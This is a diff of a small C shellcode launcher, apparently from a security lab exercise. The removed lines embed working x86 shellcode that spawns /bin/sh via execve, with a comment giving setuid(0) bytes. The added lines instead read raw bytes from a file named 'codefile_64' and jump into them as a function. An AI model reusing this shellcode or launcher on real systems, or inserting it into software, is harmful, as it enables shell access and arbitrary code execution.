@@ -1,30 +1,22 @@
 #include <stdlib.h>
 #include <stdio.h>
-#include <string.h>
 
-// Binary code for setuid(0)
-// 64-bit:  "\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05"
-// 32-bit:  "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80"
-
-const char shellcode[] =
-#if __x86_64__ // 64-bit shellcode
-    "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
-    "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
-    "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
-#else // 32-bit shellcode
-    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
-    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
-    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
-#endif
-;
-
+// Read the shellcode from a file, and then execute the code. 
 int main(int argc, char **argv)
 {
     char code[500];
+    FILE *fd;
 
-    strcpy(code, shellcode);
-    int (*func)() = (int (*)())code;
+    const char *filename = "codefile_64";
 
+    fd = fopen(filename, "r");
+    if (!fd){
+       perror(filename); exit(1);
+    }
+    fread(code, sizeof(char), 500, fd);
+
+    int (*func)() = (int(*)())code;
     func();
     return 1;
 }
+
